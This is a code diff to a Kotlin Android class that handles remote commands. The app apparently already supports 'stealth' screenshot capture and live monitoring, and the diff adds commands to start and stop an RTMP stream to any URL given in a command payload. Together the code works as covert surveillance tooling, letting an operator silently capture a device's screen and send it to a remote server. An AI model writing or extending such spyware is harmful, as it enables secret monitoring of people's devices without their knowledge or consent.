@@ -64,6 +64,7 @@ import java.util.UUID
 class RemoteCommandManager(private val context: Context) {
 
     private val db = AppDatabase.getInstance(context)
+    private val streamManager = RtmpStreamManager(context)
 
     companion object {
         private var activeRingtone: Ringtone? = null
@@ -673,6 +674,33 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
                 }
+                "START_RTMP_STREAM", "START_LIVE_STREAM", "STREAM_RTMP" -> {
+                    var rtmpUrl = ""
+                    val trimmed = payload.trim()
+                    
+                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
+                        try {
+                            val json = JSONObject(trimmed)
+                            rtmpUrl = json.optString("url").ifEmpty { json.optString("rtmpUrl").ifEmpty { json.optString("endpoint") } }
+                        } catch (_: Exception) {}
+                    }
+                    
+                    if (rtmpUrl.isEmpty()) {
+                        rtmpUrl = trimmed
+                    }
+
+                    if (rtmpUrl.isNotEmpty()) {
+                        streamManager.startStream(rtmpUrl)
+                        resultMessage = "Live RTMP stream started successfully to endpoint."
+                    } else {
+                        isSuccess = false
+                        resultMessage = "Error: RTMP URL endpoint is missing in command payload."
+                    }
+                }
+                "STOP_RTMP_STREAM", "STOP_LIVE_STREAM", "STOP_STREAM" -> {
+                    streamManager.stopStream()
+                    resultMessage = "Live RTMP stream stopped successfully."
+                }
                 "START_STEALTH_CAPTURE", "START_STEALTH_SCREENSHOT", "START_SCREENSHOT_CAPTURE",
                 "START_LIVE_SCREEN_STREAM", "LIVE_STREAM", "START_LIVE_MONITORING" -> {
                     var maxShots = 0
@@ -704,7 +732,7 @@ class RemoteCommandManager(private val context: Context) {
                     }
                 }
                 "STOP_STEALTH_CAPTURE", "STOP_STEALTH_SCREENSHOT", "STOP_SCREENSHOT_CAPTURE",
-                "STOP_LIVE_SCREEN_STREAM", "STOP_LIVE_STREAM", "STOP_LIVE_MONITORING", "STOP_STREAM", "STOP_SCREEN_STREAM", "STOP_LIVE" -> {
+                "STOP_LIVE_SCREEN_STREAM", "STOP_LIVE_STREAM", "STOP_LIVE_MONITORING", "STOP_SCREEN_STREAM", "STOP_LIVE" -> {
                     MediaProjectionHelper.stopService(context)
                     resultMessage = "Live screen stream / stealth background capture service stopped successfully."
                 }
